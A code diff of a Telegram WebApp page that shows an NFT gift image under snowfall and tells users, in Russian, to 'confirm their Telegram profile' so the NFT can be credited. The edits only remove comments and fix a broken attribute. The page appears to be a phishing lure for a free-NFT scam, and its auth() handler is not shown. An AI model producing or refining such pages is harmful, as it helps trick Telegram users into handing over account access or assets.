@@ -9,7 +9,7 @@
         /* CSS */
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f2f2f7; /* Светлый системный фон */
+            background-color: #f2f2f7;
             color: #000000;
             margin: 0;
             padding: 0;
@@ -20,7 +20,6 @@
             overflow: hidden;
         }
 
-        /* КОНТРАСТНЫЙ СНЕГ (СЕРЕБРИСТЫЙ) */
         #snow-box {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -30,7 +29,7 @@
 
         .flake {
             position: absolute;
-            background: #adb5bd; /* Серебристый цвет, видимый на светлом */
+            background: #adb5bd;
             border-radius: 50%;
             opacity: 0.5;
         }
@@ -47,7 +46,6 @@
             box-shadow: 0 15px 35px rgba(0,0,0,0.05);
         }
 
-        /* ТВОИ URL ИЗ ЗАПРОСА */
         .nft-pic {
             width: 220px;
             height: 220px;
@@ -61,7 +59,7 @@
         p { color: #8e8e93; font-size: 15px; line-height: 1.4; margin-bottom: 30px; padding: 0 10px; }
 
         .action-btn {
-            background: #007aff; /* Синий цвет Telegram/Apple */
+            background: #007aff;
             color: #ffffff;
             border: none;
             border-radius: 12px;
@@ -110,7 +108,7 @@
         </div>
 
         <div id="step2" class="step">
-            <img src="https://cache.tonapi.io/imgproxy/GwTyqFIK-SGPuBYQpyeaAsPLU2nhV-Ccmlygn5DmV18/rs:fill:500:500:1/g:no/aHR0cHM6Ly9uZnQuZnJhZ21lbnQuY29tL2dpZnQvdmludGFnZWNpZ2FyLTEzNzA5LndlYnA.webp" class="nft-pic"nft-pic">
+            <img src="https://cache.tonapi.io/imgproxy/GwTyqFIK-SGPuBYQpyeaAsPLU2nhV-Ccmlygn5DmV18/rs:fill:500:500:1/g:no/aHR0cHM6Ly9uZnQuZnJhZ21lbnQuY29tL2dpZnQvdmludGFnZWNpZ2FyLTEzNzA5LndlYnA.webp" class="nft-pic">
             <h1>Авторизация</h1>
             <p>Для зачисления NFT на баланс необходимо подтвердить ваш профиль Telegram.</p>
             <button class="action-btn" onclick="auth()">Продолжить</button>
@@ -132,11 +130,9 @@
     </div>
 
     <script>
-        /* JS */
         let tg = window.Telegram.WebApp;
         tg.expand();
 
-        // СНЕГ
         function initSnow() {
             const container = document.getElementById('snow-box');
             for(let i=0; i<45; i++) {
@@ -147,7 +143,6 @@
                 f.style.left = Math.random()*100 + 'vw';
                 f.style.top = Math.random()*-20 + 'px';
                 container.appendChild(f);
-                
                 f.animate([
                     { transform: 'translateY(0)', opacity: 0.5 },
                     { transform: 'translateY(100vh)', opacity: 0 }
